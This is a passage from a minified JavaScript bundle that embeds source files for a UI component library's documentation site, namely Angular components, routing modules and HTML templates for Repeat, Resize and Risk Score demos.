IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-visual-test",\n    templateUrl: "./repeat-visual-test.component.html",\n})\nexport class RepeatVisualTestComponent {}\n'},15315:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ScrollingModule } from "@angular/cdk/scrolling";\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiIconModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiProgressModule,\n    NuiRepeatModule,\n    NuiSearchModule,\n    NuiSwitchModule,\n    NuiTabsModule,\n    SrlcStage,\n    DEMO_PATH_TOKEN,\n} from "@nova-ui/bits";\n\nimport {\n    RepeatDisabledMultiSelectionExampleComponent,\n    RepeatDragHandleExampleComponent,\n    RepeatDragPreviewExampleComponent,\n    RepeatDragSimpleExampleComponent,\n    RepeatExampleComponent,\n    RepeatItemExampleComponent,\n    RepeatMultiSelectionExampleComponent,\n    RepeatRadioSelectionModeExampleComponent,\n    RepeatRadioWithNonRequiredSelectionModeExampleComponent,\n    RepeatReorderItemConfigExampleComponent,\n    RepeatReorderSimpleExampleComponent,\n    RepeatSimpleExampleComponent,\n    RepeatSingleSelectionModeExampleComponent,\n    RepeatSingleWithRequiredSelectionModeExampleComponent,\n    RepeatTestComponent,\n    RepeatVisualTestComponent,\n    RepeatVirtualScrollComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: RepeatExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "repeat-item",\n        component: RepeatItemExampleComponent,\n    },\n    {\n        path: "repeat-test",\n        component: RepeatTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "repeat-visual-test",\n        component: RepeatVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiDocsModule,\n        NuiFormFieldModule,\n        NuiIconModule,\n        NuiMessageModule,\n        NuiProgressModule,\n        NuiRepeatModule,\n        NuiSearchModule,\n        NuiSwitchModule,\n        NuiTabsModule,\n        RouterModule.forChild(routes),\n        ScrollingModule,\n    ],\n    declarations: [\n        RepeatExampleComponent,\n        RepeatItemExampleComponent,\n        RepeatDisabledMultiSelectionExampleComponent,\n        RepeatMultiSelectionExampleComponent,\n        RepeatRadioSelectionModeExampleComponent,\n        RepeatRadioWithNonRequiredSelectionModeExampleComponent,\n        RepeatSimpleExampleComponent,\n        RepeatDragSimpleExampleComponent,\n        RepeatReorderSimpleExampleComponent,\n        RepeatDragPreviewExampleComponent,\n        RepeatSingleSelectionModeExampleComponent,\n        RepeatSingleWithRequiredSelectionModeExampleComponent,\n        RepeatTestComponent,\n        RepeatVisualTestComponent,\n        RepeatReorderItemConfigExampleComponent,\n        RepeatDragHandleExampleComponent,\n        RepeatVirtualScrollComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("repeat"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class RepeatModule {}\n'},64019:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./resize-basic/resize-basic.example.component";\nexport * from "./resize-percents/resize-percents.example.component";\nexport * from "./resize-nested/resize-nested.example.component";\nexport * from "./resize-docs/resize-docs.example.component";\nexport * from "./resize-visual-test/resize-visual-test.component";\n'},89129:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex" style="position: relative">\n    <div\n        nuiResizer\n        resizerDirection="right"\n        (resizerSizeChanged)="sizeChanged($event)"\n    >\n        <p class="m-2" style="background-color: yellow" i18n>\n            This block is resizable. {{ newSizeText }}\n        </p>\n    </div>\n</div>\n'},55653:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-resize-basic-example",\n    templateUrl: "./resize-basic.example.component.html",\n})\nexport class ResizeBasicExampleComponent {\n    public newSizeText: string = "Size is not changed.";\n\n    public sizeChanged(size: string): void {\n        this.newSizeText = `New size is ${size}`;\n    }\n}\n'},81685:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Basic Usage</h2>\n<p>\n    Resize works with flexbox items, nested elements, and inline elements. The\n    only required input is <code>nuiResizerDirection</code> that accepts values\n    from\n    <a target="_blank" href="../interfaces/ResizeDirection.html"\n        ><code>ResizeDirection</code></a\n    >\n    Enum.\n</p>\n<p>\n    Also there is a <code>(nuiResizerSizeChanged)</code> output that is\n    returning string with style value of a changed size dimension.\n</p>\n<nui-message type="info">\n    Please note that parent container for <code>nuiResizer</code> directive\n    should have <code>position</code> value other than <code>static</code>;\n</nui-message>\n<nui-example-wrapper filenamePrefix="resize-basic" exampleTitle="Basic Usage">\n    <nui-resize-basic-example></nui-resize-basic-example>\n</nui-example-wrapper>\n\n<h2>Handling Percentage Values</h2>\n<p>\n    Resize works with percents as well. To do so, input\n    <code>[nuiResizerValue]</code> should be specified with\n    <a target="_blank" href="../interfaces/ResizeValue.html"\n        ><code>ResizeValue</code></a\n    >\n    equal to <code>percent</code>\n</p>\n<p>\n    To see the effect, try to resize the yellow block and then resize the\n    screen: since directive is changing percentage value of a size, the ratio\n    between blocks is kept.\n</p>\n<nui-example-wrapper\n    filenamePrefix="resize-percents"\n    exampleTitle="Handling percentage values"\n>\n    <nui-resize-percents-example></nui-resize-percents-example>\n</nui-example-wrapper>\n\n<h2>Nested Resizers</h2>\n<p>\n    This example shows how you can use several resizer directives to make all\n    blocks resizable.\n</p>\n<nui-message type="info">\n    If you need something as complex, as this example, please consider usage of\n    Layout components (Sheets)\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="resize-nested"\n    exampleTitle="Nested Resizers"\n>\n    <nui-resize-nested-example></nui-resize-nested-example>\n</nui-example-wrapper>\n'},52785:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-resize-docs-example",\n    templateUrl: "resize-docs.example.component.html",\n})\nexport class ResizeDocsExampleComponent {}\n'},7621:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-column" style="position: relative; height: 500px">\n    <div\n        nuiResizer\n        resizerDirection="bottom"\n        style="overflow-y: auto; min-height: 50px; max-height: 200px"\n    >\n        <p class="m-2" i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n            efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n            efficitur luctus quis ac elit. Nam odio est, iaculis nec varius id,\n            congue erat. Nullam mi lectus, gravida quis pretium sit amet,\n            accumsan non elit. In tempus commodo sem ac vulputate. Sed vel\n            sagittis purus. Integer non ornare felis. Sed aliquam, purus et\n            euismod tincidunt, felis ligula fermentum mi, eget commodo nisl orci\n            efficitur dui. Etiam interdum justo magna consequat, vitae hendrerit\n            mi aliquam. Sed non ex eu purus ornare lobortis tempus id est.\n            Aenean dictum at dui sit amet mollis. Phasellus mauris arcu, blandit\n            id congue vitae, elementum amet enim. Pellentesque et facilisis leo,\n            sit amet rhoncus magna. Integer commodo lobortis arcu et bibendum.\n            Pellentesque sagittis magna sed tellus volutpat, sed eleifend justo\n            ornare. Fusce porttitor laoreet dui a mollis.\n        </p>\n    </div>\n    <div\n        class="d-flex flex-row"\n        style="position: relative; overflow-x: hidden; height: 300px"\n    >\n        <div\n            nuiResizer\n            resizerDirection="right"\n            style="width: 40%; min-width: 30%; max-width: 50%; overflow-y: auto"\n            class="flex-shrink-0"\n        >\n            <p class="m-2" i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n        <div\n            nuiResizer\n            resizerDirection="right"\n            style="width: 40%; min-width: 10%; max-width: 40%; overflow-y: auto"\n            class="flex-shrink-0"\n        >\n            <p class="m-2" i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n        <div style="width: auto; min-width: 10%; overflow-y: auto">\n            <p class="m-2" i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </div>\n</div>\n'},23681:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-resize-nested-example",\n    templateUrl: "./resize-nested.example.component.html",\n})\nexport class ResizeNestedExampleComponent {}\n'},27461:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-row" style="position: relative">\n    <div\n        nuiResizer\n        resizerDirection="right"\n        [resizerValue]="measurement"\n        style="min-width: 100px"\n    >\n        <p class="m-2" style="background-color: yellow" i18n>\n            This block is resizable\n        </p>\n    </div>\n    <div class="m-2" style="min-width: 200px" i18n>\n        This block has min-width:200px\n    </div>\n</div>\n'},20225:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ResizeUnit } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-resize-percents-example",\n    templateUrl: "./resize-percents.example.component.html",\n})\nexport class ResizePercentsExampleComponent {\n    public measurement = ResizeUnit.percent;\n}\n'},20059:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Nested Resizers</h3>\n    <div class="d-flex flex-column" style="position: relative; height: 500px">\n        <div\n            nuiResizer\n            id="nui-visual-test-resize-nested-1"\n            resizerDirection="bottom"\n            style="overflow-y: auto; min-height: 50px; max-height: 200px"\n        >\n            <p class="m-2">\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n        <div\n            class="d-flex flex-row"\n            style="position: relative; overflow-x: hidden; height: 300px"\n        >\n            <div\n                nuiResizer\n                id="nui-visual-test-resize-nested-2"\n                resizerDirection="right"\n                style="\n                    width: 40%;\n                    min-width: 30%;\n                    max-width: 50%;\n                    overflow-y: auto;\n                "\n                class="flex-shrink-0"\n            >\n                <p class="m-2">\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n            <div\n                nuiResizer\n                id="nui-visual-test-resize-nested-3"\n                resizerDirection="right"\n                style="\n                    width: 40%;\n                    min-width: 10%;\n                    max-width: 40%;\n                    overflow-y: auto;\n                "\n                class="flex-shrink-0"\n            >\n                <p class="m-2">\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n            <div style="width: auto; min-width: 10%; overflow-y: auto">\n                <p class="m-2">\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Donec efficitur rutrum lacus id vulputate. Integer eu ex eu\n                    augue efficitur luctus quis ac elit. Nam odio est, iaculis\n                    nec varius id, congue erat. Nullam mi lectus, gravida quis\n                    pretium sit amet, accumsan non elit. In tempus commodo sem\n                    ac vulputate. Sed vel sagittis purus. Integer non ornare\n                    felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n                    fermentum mi, eget commodo nisl orci efficitur dui. Etiam\n                    interdum justo magna consequat, vitae hendrerit mi aliquam.\n                    Sed non ex eu purus ornare lobortis tempus id est. Aenean\n                    dictum at dui sit amet mollis. Phasellus mauris arcu,\n                    blandit id congue vitae, elementum amet enim. Pellentesque\n                    et facilisis leo, sit amet rhoncus magna. Integer commodo\n                    lobortis arcu et bibendum. Pellentesque sagittis magna sed\n                    tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                    laoreet dui a mollis.\n                </p>\n            </div>\n        </div>\n    </div>\n    <hr />\n</div>\n'},16771:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-resize-visual-test",\n    templateUrl: "./resize-visual-test.component.html",\n})\nexport class ResizeVisualTestComponent {}\n'},55525:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiCommonModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ResizeBasicExampleComponent,\n    ResizeDocsExampleComponent,\n    ResizeNestedExampleComponent,\n    ResizePercentsExampleComponent,\n    ResizeVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ResizeDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "resizer-visual-test",\n        component: ResizeVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiCommonModule,\n        NuiDocsModule,\n        NuiTextboxModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ResizeBasicExampleComponent,\n        ResizePercentsExampleComponent,\n        ResizeNestedExampleComponent,\n        ResizeDocsExampleComponent,\n        ResizeVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("resize"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ResizeModule {}\n'},34735:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./risk-score-basic/risk-score-basic.example.component";\nexport * from "./risk-score-docs/risk-score-docs.example.component";\n'},8925:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const 